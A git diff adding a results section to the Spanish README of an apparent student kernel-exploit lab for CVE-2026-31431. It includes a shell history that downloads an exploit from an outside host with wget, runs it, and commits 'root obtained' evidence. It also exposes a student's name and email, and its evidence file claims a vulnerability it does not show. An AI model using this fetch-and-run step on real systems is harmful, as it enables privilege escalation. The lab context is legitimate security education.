@@ -136,3 +136,82 @@ Esta v2 incorpora los siguientes fixes respecto a la v1:
 - BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
 - BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
 - Workflow Actions: greps de verificación con `|| echo`, tolerantes
+
+
+#Results:
+~ $ uname -r
+# 6.12.0
+
+~ $ lsmod | grep alg
+# -sh: lsmod: not found
+
+~ $ id
+# uid=1001(student) gid=1001(student) groups=1001(student)
+
+~ $ whoami
+# student
+
+~ $ cat /proc/modules | grep algif
+# cat: can't open '/proc/modules': No such file or directory
+
+History 
+1  apt update
+    2  apt install gh
+    3  gh api user --jq '"\(.name) → \(.email // .login)"'
+    4  git config --global user.name "sammy1208-g"
+    5  git config --global user.email "samchamorroca@uide.edu.ec"
+    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
+    7  make setup
+    8  make qemu
+    9  apt update
+   10  apt install file -y
+   11  make setup
+   12  make qemu
+   13  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
+   14  make qemu
+   15  cp /root/hito1.txt evidence/hito1_vuln_confirmed.txt
+   16  cat > evidence/hito1_vuln_confirmed.txt << 'EOF'
+=== HITO 1: KERNEL VULNERABLE CONFIRMADO ===
+Fecha: Mon May 11 13:19:54 UTC 2026
+Hostname: copy-fail-sammy1208-g
+Kernel: 6.12.0
+Identidad: uid=1001(student) gid=1001(student) groups=1001(student)
+Módulos AF_ALG:
+(no encontrado con lsmod, verificar /proc/modules)
+algif_aead en /proc/modules:
+(no encontrado)
+EOF
+
+   17  mkdir -p evidence
+   18  cat > evidence/hito1_vuln_confirmed.txt << 'EOF'
+=== HITO 1: KERNEL VULNERABLE CONFIRMADO ===
+Fecha: Mon May 11 13:19:54 UTC 2026
+Hostname: copy-fail-sammy1208-g
+Kernel: 6.12.0
+Identidad: uid=1001(student) gid=1001(student) groups=1001(student)
+Módulos AF_ALG:
+(no encontrado con lsmod, verificar /proc/modules)
+algif_aead en /proc/modules:
+(no encontrado)
+EOF
+
+   19  cat evidence/hito1_vuln_confirmed.txt
+   20  git add evidence/hito1_vuln_confirmed.txt
+   21  git commit -m "hito-1: kernel vulnerable confirmado - $(date +%Y-%m-%dT%H:%M)"
+   22  git tag -a hito-1 -m "Kernel vulnerable corriendo, algif_aead confirmado"
+   23  git push origin main --tags
+   24  git tag
+   25  wget https://copy.fail/exp -O copy_fail_exp.py
+   26  cat copy_fail_exp.py
+   27  make qemu
+   28  id
+   29  python3 copy_fail_exp.py
+   30  git add evidence/hito2_root_shell.txt
+   31  git commit -m "hito-2: exploit exitoso, root obtenido - $(date +%Y-%m-%dT%H:%M)"
+   32  git tag -a hito-2 -m "CVE-2026-31431 explotado exitosamente"
+   33  git push origin main --tags
+   34  git tag
+   35  python3 copy_fail_exp.py
+   36  python3 copy_fail_exp.py 2>&1
+   37  {   echo "=== HITO 3: MITIGACIÓN TEMPORAL ===";   echo "Fecha: $(date)";   echo "Hostname: $(hostname)";   echo "algif_aead en lsmod:";   cat /proc/modules | grept
+   38  history
